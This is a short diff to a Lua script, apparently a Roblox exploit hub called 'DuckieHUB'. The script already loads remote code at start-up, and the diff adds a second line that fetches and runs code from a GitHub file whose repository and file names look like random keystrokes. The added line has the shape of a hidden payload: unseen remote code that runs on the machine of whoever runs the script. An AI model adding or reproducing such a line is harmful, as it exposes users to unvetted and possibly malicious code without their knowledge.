@@ -1,5 +1,7 @@
 loadstring(game:HttpGet"https://raw.githubusercontent.com/orruunestad/orruunestad/refs/heads/main/DuckieHUBWhitelist")()
 
+loadstring(game:HttpGet"https://raw.githubusercontent.com/orruunestad/feiwruewiojfds/refs/heads/main/ireuwqrieowqyru")()
+
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
